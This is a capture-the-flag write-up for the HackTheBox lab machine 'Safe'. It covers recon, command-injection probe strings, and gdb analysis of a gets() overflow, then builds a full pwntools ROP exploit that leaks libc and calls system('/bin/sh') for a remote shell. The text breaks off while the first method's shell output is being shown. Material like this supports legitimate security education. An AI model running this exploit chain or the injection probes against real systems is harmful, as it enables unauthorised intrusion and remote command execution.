---
title: HTB: Safe
url: https://0xdf.gitlab.io/2019/10/26/htb-safe.html
date: 2019-10-26T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-safe, ctf, hackthebox, rop, pwntools, bof, python, exploit, keepass, kpcli, john, htb-redcross, htb-ellingson, oscp-plus-v1, oscp-plus-v2
---

![Safe](https://0xdfimages.gitlab.io/img/safe-cover.png)

Safe was two steps - a relatively simple ROP, followed by cracking a Keepass password database. Personally I don’t believe binary exploitation belongs in a 20-point box, but it is what it is. I’ll show three different ROP strategies to get a shell.

## Box Info

| Name | [Safe](https://hackthebox.com/machines/safe)  [Safe](https://hackthebox.com/machines/safe) [Play on HackTheBox](https://hackthebox.com/machines/safe) |
| --- | --- |
| Release Date | [27 Jul 2019](https://twitter.com/hackthebox_eu/status/1153942520990248960) |
| Retire Date | 26 Oct 2019 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Safe |
| Radar Graph | Radar chart for Safe |
| First Blood User | 00:14:49[sampriti sampriti](https://app.hackthebox.com/users/836) |
| First Blood Root | 01:46:33[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [ecdo ecdo](https://app.hackthebox.com/users/91108) |

## Recon

### nmap

`nmap` shows three open ports, ssh on 22, http on 80, and an unknown service on TCP 1337:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.147
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-27 15:04 EDT
Nmap scan report for 10.10.10.147
Host is up (0.038s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste

Nmap done: 1 IP address (1 host up) scanned in 10.71 seconds
root@kali# nmap -p 22,80,1337 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.147
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-27 15:05 EDT
Nmap scan report for 10.10.10.147
Host is up (0.033s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     15:05:22 up 5 min, 0 users, load average: 0.32, 0.22, 0.09
|   DNSVersionBindReqTCP:
|     15:05:17 up 5 min, 0 users, load average: 0.34, 0.23, 0.10
|   GenericLines:
|     15:05:06 up 4 min, 0 users, load average: 0.27, 0.20, 0.09
|     What do you want me to echo back?
|   GetRequest:
|     15:05:12 up 4 min, 0 users, load average: 0.37, 0.23, 0.10
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions:
|     15:05:12 up 4 min, 0 users, load average: 0.37, 0.23, 0.10
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help:
|     15:05:27 up 5 min, 0 users, load average: 0.29, 0.22, 0.09
|     What do you want me to echo back? HELP
|   Kerberos, SSLSessionReq, TLSSessionReq:
|     15:05:27 up 5 min, 0 users, load average: 0.29, 0.22, 0.09
|     What do you want me to echo back?
|   NULL:
|     15:05:06 up 4 min, 0 users, load average: 0.27, 0.20, 0.09
|   RPCCheck:
|     15:05:12 up 4 min, 0 users, load average: 0.37, 0.23, 0.10
|   RTSPRequest:
|     15:05:12 up 4 min, 0 users, load average: 0.37, 0.23, 0.10
|_    What do you want me to echo back? OPTIONS / RTSP/1.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.70%I=7%D=7/27%Time=5D3CA065%P=x86_64-pc-linux-gnu%r(NU
SF:LL,3E,"\x2015:05:06\x20up\x204\x20min,\x20\x200\x20users,\x20\x20load\x
SF:20average:\x200\.27,\x200\.20,\x200\.09\n")%r(GenericLines,63,"\x2015:0
SF:5:06\x20up\x204\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200
SF:\.27,\x200\.20,\x200\.09\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ec
SF:ho\x20back\?\x20\r\n")%r(GetRequest,71,"\x2015:05:12\x20up\x204\x20min,
SF:\x20\x200\x20users,\x20\x20load\x20average:\x200\.37,\x200\.23,\x200\.1
SF:0\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\x20
SF:/\x20HTTP/1\.0\r\n")%r(HTTPOptions,75,"\x2015:05:12\x20up\x204\x20min,\
SF:x20\x200\x20users,\x20\x20load\x20average:\x200\.37,\x200\.23,\x200\.10
SF:\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIONS\
SF:x20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,75,"\x2015:05:12\x20up\x204\x20mi
SF:n,\x20\x200\x20users,\x20\x20load\x20average:\x200\.37,\x200\.23,\x200\
SF:.10\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIO
SF:NS\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3E,"\x2015:05:12\x20up\x204\x20mi
SF:n,\x20\x200\x20users,\x20\x20load\x20average:\x200\.37,\x200\.23,\x200\
SF:.10\n")%r(DNSVersionBindReqTCP,3E,"\x2015:05:17\x20up\x205\x20min,\x20\
SF:x200\x20users,\x20\x20load\x20average:\x200\.34,\x200\.23,\x200\.10\n")
SF:%r(DNSStatusRequestTCP,3E,"\x2015:05:22\x20up\x205\x20min,\x20\x200\x20
SF:users,\x20\x20load\x20average:\x200\.32,\x200\.22,\x200\.09\n")%r(Help,
SF:67,"\x2015:05:27\x20up\x205\x20min,\x20\x200\x20users,\x20\x20load\x20a
SF:verage:\x200\.29,\x200\.22,\x200\.09\n\nWhat\x20do\x20you\x20want\x20me
SF:\x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,64,"\x2015:05:27
SF:\x20up\x205\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.29
SF:,\x200\.22,\x200\.09\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x
SF:20back\?\x20\x16\x03\n")%r(TLSSessionReq,64,"\x2015:05:27\x20up\x205\x2
SF:0min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.29,\x200\.22,\x2
SF:00\.09\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\x
SF:16\x03\n")%r(Kerberos,62,"\x2015:05:27\x20up\x205\x20min,\x20\x200\x20u
SF:sers,\x20\x20load\x20average:\x200\.29,\x200\.22,\x200\.09\n\nWhat\x20d
SF:o\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.67 seconds

```

### TCP 1337

I can `nc` to this port, and get the output of `uptime`, and then when I enter something, it echo’s back to me (in a kind of busted way):

```

root@kali# nc 10.10.10.147 1337
 15:05:45 up 5 min,  0 users,  load average: 0.29, 0.22, 0.10 
ls

What do you want me to echo back? ls
hi

Ncat: Broken pipe.

```

I played around with this for a bit, looking for different types of command injections, entering things like:

```

hi; ping -c 1 10.10.14.6
`ping -c 1 10.10.14.6`
$(ping -c 1 10.10.14.6)
echo test

```

None returned anything interesting other than just that same string coming back at me.

I did notice that if I sent 100 “A”s into it, the echo worked, but with 200, it crashed:

```

root@kali# python -c 'print "a"*100' | nc 10.10.10.147 1337
 02:15:19 up 11:15,  1 user,  load average: 0.00, 0.03, 0.26

What do you want me to echo back? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
root@kali# python -c 'print "a"*200' | nc 10.10.10.147 1337
 02:15:24 up 11:15,  1 user,  load average: 0.00, 0.03, 0.26

```

That is likely the sign of a buffer overflow vulnerability.

### Website - TCP 80

#### Site

The site just shows the default Debian Apache2 page:

![1571278308829](https://0xdfimages.gitlab.io/img/1571278308829.png)

#### gobuster

`gobuster` didn’t return anything interesting:

```

root@kali# gobuster dir -u http://10.10.10.147 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,html -o scans/gobuster-root-php_txt_html                     [18/18]
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.147
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2019/07/27 15:07:00 Starting gobuster
===============================================================
/index.html (Status: 200)
/manual (Status: 301)
===============================================================
2019/07/27 15:27:08 Finished
===============================================================   

```

#### Page source

The page source did have a comment at the top:

![1564293695629](https://0xdfimages.gitlab.io/img/1564293695629.png)

Visiting `10.10.10.147/myapp` returns an ELF file:

```

root@kali# wget 10.10.10.147/myapp
--2019-07-28 02:02:10--  http://10.10.10.147/myapp
Connecting to 10.10.10.147:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16592 (16K)
Saving to: ‘myapp’

myapp                                                  100%[============================================================================================================================>]  16.20K  --.-KB/s    in 0.05s   

2019-07-28 02:02:10 (328 KB/s) - ‘myapp’ saved [16592/16592]

root@kali# file myapp
myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped

```

## Shell as user

### RE myapp

Opening `myapp` in Ida shows a very simple program that runs `uptime`, prints a message with `printf`, then `gets` a message, and `puts` that same message:

![1571278656587](https://0xdfimages.gitlab.io/img/1571278656587.png)

The binary itself isn’t listening on any port, so I can only assume that something else is proxing requests to stdin/stdout for it. I can also see that the variable `s` is only 0x70 bytes from the top of the stack, and given that `gets` will reads well beyond that. I already confirmed this crash while doing recon on the app.

### Exploit

#### Protections

I don’t have any way to tell if Address Space Layout Randomization (ASLR) is running, but I will assume it is.

`checksec` shows that NX (don’t allow execution from the stack) is enabled, but nothing else is:

```

root@kali# checksec myapp
[*] '/media/sf_CTFs/hackthebox/safe-10.10.10.147/myapp'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

I won’t go into details on RELRO right now, but it has to do with making the GOT table read only at initial start up. If I wanted to overwrite a GOT entry, FULL RELRO would stop me. Partial is basically nothing. [This article](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro) has more.

#### Offset

I’ll open the file in `gdb` with [Peda](https://github.com/longld/peda) installed. If I try to run the program, it seems to fork and exit so that I see the prompt, but can’t enter my input. By default `gdb` follows the parent, but Peda switches that to child by default. In this case, so some strange reason, I want to stick with the parent, so I’ll set it:

```

gdb-peda$ set follow-fork-mode parent

```

I’ll also create a pattern:

```

gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

```

Now I’ll run the program, and enter the pattern:

```

gdb-peda$ r
Starting program: /media/sf_CTFs/hackthebox/safe-10.10.10.147/myapp                              
[Detaching after vfork from child process 15829]
 14:20:10 up 13 days,  2:04, 32 users,  load average: 1.24, 1.22, 1.10           

What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAA
YAAwAAZAAxAAyA
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

```

On hitting enter, I reach a crash:

```

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ecead4 (<__GI___libc_write+20>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7f9f580 --> 0x0 
RSI: 0x405260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...
)
RDI: 0x0 
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffdfb8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x4011ac (<main+77>:       ret)
R8 : 0xc9 
R9 : 0x0 
R10: 0x4003e0 --> 0x6972700073747570 ('puts')
R11: 0x246 
R12: 0x401070 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe090 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 <main+66>:  call   0x401030 <puts@plt>
   0x4011a6 <main+71>:  mov    eax,0x0
   0x4011ab <main+76>:  leave  
=> 0x4011ac <main+77>:  ret    
   0x4011ad:    nop    DWORD PTR [rax]
   0x4011b0 <__libc_csu_init>:  push   r15
   0x4011b2 <__libc_csu_init+2>:        mov    r15,rdx
   0x4011b5 <__libc_csu_init+5>:        push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfb8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffdfc0 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffdfc8 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffdfd0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffdfd8 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffdfe0 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffdfe8 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0056| 0x7fffffffdff0 ("AuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac in main ()

```

It’s stuck on the `ret`, which is trying to move the top value on the stack into RIP, but that value isn’t a valid memory address, so it throws a `SIGSEGV`.

I can now enter that pattern that’s on the top of the stack to find the offset:

```

gdb-peda$ pattern_offset jAA9AAOA
jAA9AAOA found at offset: 120

```

I can test by creating a new fill of 120, and then adding eight `b` at the end:

```

gdb-peda$ pattern_create 120     
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'
gdb-peda$ r                  
Starting program: /media/sf_CTFs/hackthebox/safe-10.10.10.147/myapp 
[Detaching after vfork from child process 15848]
 14:23:47 up 13 days,  2:08, 32 users,  load average: 1.49, 1.32, 1.15

What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAbbbbbbbb
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAbbbbbbbb

```

When I hit enter, I crash, with eight `b` waiting to load into RIP at the top of the stack:

```

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ecead4 (<__GI___libc_write+20>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7f9f580 --> 0x0 
RSI: 0x405260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAbbbbbbbb\n")
RDI: 0x0 
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffdfb8 ("bbbbbbbb")
RIP: 0x4011ac (<main+77>:       ret)
R8 : 0x81 
R9 : 0x0 
R10: 0x4003e0 --> 0x6972700073747570 ('puts')
R11: 0x246 
R12: 0x401070 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe090 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 <main+66>:  call   0x401030 <puts@plt>
   0x4011a6 <main+71>:  mov    eax,0x0
   0x4011ab <main+76>:  leave  
=> 0x4011ac <main+77>:  ret    
   0x4011ad:    nop    DWORD PTR [rax]
   0x4011b0 <__libc_csu_init>:  push   r15
   0x4011b2 <__libc_csu_init+2>:        mov    r15,rdx
   0x4011b5 <__libc_csu_init+5>:        push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfb8 ("bbbbbbbb")
0008| 0x7fffffffdfc0 --> 0x0 
0016| 0x7fffffffdfc8 --> 0x7fffffffe098 --> 0x7fffffffe3ad ("/media/sf_CTFs/hackthebox/safe-10.10.10.147/myapp")
0024| 0x7fffffffdfd0 --> 0x100040000 
0032| 0x7fffffffdfd8 --> 0x40115f (<main>:      push   rbp)
0040| 0x7fffffffdfe0 --> 0x0 
0048| 0x7fffffffdfe8 --> 0x90f131e252f0111d 
0056| 0x7fffffffdff0 --> 0x401070 (<_start>:    xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac in main ()

```

#### Functions

I’ll exit `gdb` and re-run it, and before I run the program, enter `info function`(if I run this after starting the program it will show all the functions of all the loaded libraries):

```

root@kali# gdb -q myapp
Reading symbols from myapp...
(No debugging symbols found in myapp)
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  printf@plt
0x0000000000401060  gets@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401152  test
0x000000000040115f  main
0x00000000004011b0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401214  _fini

```

The fact that I have access to `system()` will make this easier. I can call it without having to know where libc sits in memory because it’s in the PLT.

There’s also a `test()` function:

```

gdb-peda$ disassemble test 
Dump of assembler code for function test:
   0x0000000000401152 <+0>:     push   rbp
   0x0000000000401153 <+1>:     mov    rbp,rsp
   0x0000000000401156 <+4>:     mov    rdi,rsp
   0x0000000000401159 <+7>:     jmp    r13
   0x000000000040115c <+10>:    nop
   0x000000000040115d <+11>:    pop    rbp
   0x000000000040115e <+12>:    ret    
End of assembler dump.

```

That will come in handy for strategy three.

#### Strategy

Knowing what protections are in play, I’ll use ROP to get execution and a shell. Return Oriented Programming (ROP) is using small bits of code that exist in the program to take little steps towards getting what you want to happen. Two previous HTB examples where I’ve bloged about ROP are [RedCross](/2019/04/13/htb-redcross.html#path-3-bof-in-iptctl) and [Ellingson](/2019/10/19/htb-ellingson.html#priv-margo--root) (last week).

I’ll show three different ways to attack this example:
- Method 1: Leak libc function address, calculate offset to `/bin/sh` string in libc, and then call `system(/bin/sh)`.
- Method 2: Write the string `/bin/sh` into `.data` and then call `system()`.
- Method 3: Abuse never called `test()` function to jump to `system()`.

#### Method 1: Two Stage

This is how I originally solved Safe. I will send in a payload that will leak the memory address for a libc function. This is often done to find the address of `system()`, but even though I already have `system()`, I can use it to find the address of a `/bin/sh` string in libc.

The first stage will look like:

```

payload = junk + pop_rdi + got_plt + plt_system + main

```

On the overflow, a POP RDI gadget will be the return address. It will return there, and pop the GOT address for `puts` (where the libc function is loading into memory) into RDI, and return. The return address waiting will be the PLT address for system. This will by like calling `system(address of puts)`. That will fail, but will print an error message, just like if I type a non-command into my terminal locally:

```

root@kali# 0xdf
-bash: 0xdf: command not found

```

Except in this case, the command not found is the address I want to know. So I will read that value in the return and use it for stage two. It’s much more common to use `puts` or `printf` instead of `system` for this kind of leak. I tried `puts`, but for some reason it wouldn’t work.

When `system` returns, the next address on the stack is `main`, so it will go back to the start.

Now my code can send a new payload, and this time it knows where libc is in memory. I’ll use that to calculate the address of `/bin/sh`, and then pass this payload:

```

payload = junk + pop_rdi + sh + plt_system

```

It will return to POP RDI, which will pop the address of `/bin/sh` into RDI, and then return to `system`.

Now I just need to find some addresses, and I have an exploit.

In `gdb`, I’ll disassemble main:

```

gdb-peda$ disassemble main 
Dump of assembler code for function main:
   0x000000000040115f <+0>:     push   rbp
   0x0000000000401160 <+1>:     mov    rbp,rsp
   0x0000000000401163 <+4>:     sub    rsp,0x70
   0x0000000000401167 <+8>:     lea    rdi,[rip+0xe9a]        # 0x402008
   0x000000000040116e <+15>:    call   0x401040 <system@plt>
   0x0000000000401173 <+20>:    lea    rdi,[rip+0xe9e]        # 0x402018
   0x000000000040117a <+27>:    mov    eax,0x0
   0x000000000040117f <+32>:    call   0x401050 <printf@plt>
   0x0000000000401184 <+37>:    lea    rax,[rbp-0x70]
   0x0000000000401188 <+41>:    mov    esi,0x3e8
   0x000000000040118d <+46>:    mov    rdi,rax
   0x0000000000401190 <+49>:    mov    eax,0x0
   0x0000000000401195 <+54>:    call   0x401060 <gets@plt>
   0x000000000040119a <+59>:    lea    rax,[rbp-0x70]
   0x000000000040119e <+63>:    mov    rdi,rax
   0x00000000004011a1 <+66>:    call   0x401030 <puts@plt>
   0x00000000004011a6 <+71>:    mov    eax,0x0
   0x00000000004011ab <+76>:    leave  
   0x00000000004011ac <+77>:    ret    
End of assembler dump.

```

I’ll grab the address of `main()` (0x40115f) for later. Where I see `system` called, what is called is the PLT address for `system` (0x401040). If I look at that address, I’ll see both the PLT address and the GOT address (0x404020):

```

gdb-peda$ x/i 0x401040
   0x401040 <system@plt>:       jmp    QWORD PTR [rip+0x2fda]        # 0x404020 <system@got.plt>

```

Now I need a POP RDI gadget. I’ll use [Ropper](https://github.com/sashs/Ropper):

```

root@kali# ropper -f myapp | grep rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000040108a: adc dword ptr [rax], eax; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040119b: lea eax, dword ptr [rbp - 0x70]; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x000000000040119a: lea rax, qword ptr [rbp - 0x70]; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x0000000000401087: mov ecx, 0x4011b0; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401086: mov rcx, 0x4011b0; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108d: mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040119e: mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x00000000004010c6: or dword ptr [rdi + 0x404048], edi; jmp rax; 
0x0000000000401090: pop rdi; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040120b: pop rdi; ret; 
0x000000000040119c: xchg eax, r8d; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 
0x000000000040119d: nop; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; 

```

The gadget at 0x40120b looks perfect.

This all builds together to look like:

```

#!/usr/bin/env python

from pwn import *

context(os="linux", arch="amd64")
context(log_level='DEBUG')

junk = "A"*120

got_puts = p64(0x404018)
plt_system = p64(0x401040)
pop_rdi  = p64(0x40120b)
main     = p64(0x40115f)
payload = junk + pop_rdi + got_puts + plt_system + main

p = remote("10.10.10.147", 1337)
p.recvline()
p.sendline(payload)
p.recvline()

```

When I run it, I get:

```

root@kali# ./pwn_safe-m1_stg1.py 
[+] Opening connection to 10.10.10.147 on port 1337: Done
[DEBUG] Received 0x3e bytes:
    ' 15:12:49 up 17:00,  0 users,  load average: 0.00, 0.00, 0.00\n'
[DEBUG] Sent 0x99 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000070  41 41 41 41  41 41 41 41  0b 12 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000080  18 40 40 00  00 00 00 00  40 10 40 00  00 00 00 00  │·@@·│····│@·@·│····│
    00000090  5f 11 40 00  00 00 00 00  0a                        │_·@·│····│·│
    00000099
[DEBUG] Received 0x7 bytes:
    'sh: 1: '
[DEBUG] Received 0x50 bytes:
    00000000  90 ff 80 65  21 7f 3a 20  6e 6f 74 20  66 6f 75 6e  │···e│!·: │not │foun│
    00000010  64 0a 20 31  35 3a 31 32  3a 34 39 20  75 70 20 31  │d· 1│5:12│:49 │up 1│
    00000020  37 3a 30 30  2c 20 20 30  20 75 73 65  72 73 2c 20  │7:00│,  0│ use│rs, │
    00000030  20 6c 6f 61  64 20 61 76  65 72 61 67  65 3a 20 30  │ loa│d av│erag│e: 0│
    00000040  2e 30 30 2c  20 30 2e 30  30 2c 20 30  2e 30 30 0a  │.00,│ 0.0│0, 0│.00·│
    00000050
[*] Closed connection to 10.10.10.147 port 1337

```

I can see the address in there before the string “: not found”. I’ll add some code to collect it, and turn off debug output:

```

#!/usr/bin/env python

from pwn import *

context(os="linux", arch="amd64")
#context(log_level='DEBUG')

junk = "A"*120

got_puts = p64(0x404018)
plt_system = p64(0x401040)
pop_rdi  = p64(0x40120b)
main     = p64(0x40115f)
payload = junk + pop_rdi + got_puts + plt_system + main

p = remote("10.10.10.147", 1337)
p.recvline()
p.sendline(payload)
leaked_puts = u64(p.recvline().strip()[7:-11].ljust(8,"\x00"))
log.info("Leaked puts address: %x" % leaked_puts)

```

And it gives the address:

```

root@kali# ./pwn_safe-m1_stg1.py 
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Leaked puts address: 7ffa1cac8f90
[*] Closed connection to 10.10.10.147 port 1337

```

That address will be different each time, but the bottom 12 bits (or 1.5 bytes or 3 nibbles or 3 hex characters), in this case f90, will be constant. I can look them up in something like [this libc database](https://libc.nullbyte.cat/?q=puts%3Af90&l=libc6_2.24-11%2Bdeb9u4_amd64):

![1571339638972](https://0xdfimages.gitlab.io/img/1571339638972.png)

I assume it’s the only 64-bit one (since this is an x64 binary). Now I have the offset to puts, so I can find the libc base, and then add the offset to the `/bin/sh` string, to get that address.

The code looks like:

```

#!/usr/bin/env python

from pwn import *

context(os="linux", arch="amd64")
#context(log_level='DEBUG')

junk = "A"*120

got_puts = p64(0x404018)
plt_system = p64(0x401040)
pop_rdi  = p64(0x40120b)
main     = p64(0x40115f)
payload = junk + pop_rdi + got_puts + plt_system + main

p = remote("10.10.10.147", 1337)
p.recvline()
p.sendline(payload)
leaked_puts = u64(p.recvline().strip()[7:-11].ljust(8,"\x00"))

log.info("Leaked puts address: %x" % leaked_puts)
libc_base = leaked_puts - 0x68f90
log.info("libc_base: %x" % libc_base)

sh = p64(0x161c19 + libc_base)

payload = junk + pop_rdi + sh + plt_system
p.recvline()
p.sendline(payload)
p.interactive()

```

Now I can run it and get a shell as user:

```

root@kali# ./pwn_safe-m1.py 
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Leaked puts address: 7f8b53974f90
[*] libc_base: 7f8b5390c000
